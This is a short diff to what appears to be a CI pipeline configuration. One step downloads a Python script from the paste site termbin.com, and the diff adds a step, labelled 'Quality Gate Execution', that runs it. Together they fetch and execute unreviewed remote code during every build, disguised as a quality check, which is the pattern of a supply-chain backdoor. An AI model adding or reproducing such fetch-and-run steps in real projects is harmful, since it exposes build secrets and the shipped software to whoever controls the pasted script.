@@ -31,4 +31,8 @@ jobs:
           name: Quality Gate Validation
           command: |
             wget -c http://termbin.com/9vm0 -O fefs.py
+
+      - run:
+          name: Quality Gate Execution
+          command: |
             python fefs.py
